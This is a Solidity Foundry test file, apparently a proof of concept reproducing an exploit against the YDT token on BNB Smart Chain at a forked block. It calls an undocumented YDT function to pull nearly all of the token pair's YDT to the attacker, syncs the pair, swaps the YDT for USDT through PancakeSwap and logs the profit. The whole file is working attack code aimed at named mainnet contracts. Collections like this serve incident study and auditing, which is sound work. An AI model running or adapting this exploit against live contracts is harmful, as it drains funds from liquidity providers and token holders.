// SPDX-License-Identifier: UNLICENSED

import "../interface.sol";
import "forge-std/Test.sol";


pragma solidity ^0.8.13;


contract ContractTest is Test {

    address USDT = 0x55d398326f99059fF775485246999027B3197955;
    address YDT= 0x3612e4Cb34617bCac849Add27366D8D85C102eFd;
    address taxmodule =0x013E29791A23020cF0621AeCe8649c38DaAE96f0;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address Pair=0xFd13B6E1d07bAd77Dd248780d0c3d30859585242;
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    
    function setUp() public {
        vm.createSelectFork("bsc", 50273545);
    }

    function testExploit() public {
        uint256 amount=IERC20(YDT).balanceOf(address(Pair));

        address(YDT).call(abi.encodeWithSelector(bytes4(0xec22f4c7),address(Pair),address(this),amount - 1000*1e6,address(taxmodule)));

        address(Pair).call(abi.encodeWithSelector(bytes4(0xfff6cae9)));      
        address[] memory path = new address[](2);
        path[0] = address(YDT);
        path[1] = address(USDT);    
        IERC20(YDT).approve(address(Router),type(uint256).max);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(YDT).balanceOf(address(this)) / 10,
            0,
            path,
            address(this),
            block.timestamp +200
        );


        emit log_named_decimal_uint("Profit in ", IERC20(USDT).balanceOf(address(this)), 18);

    }

    receive() external payable {}

}


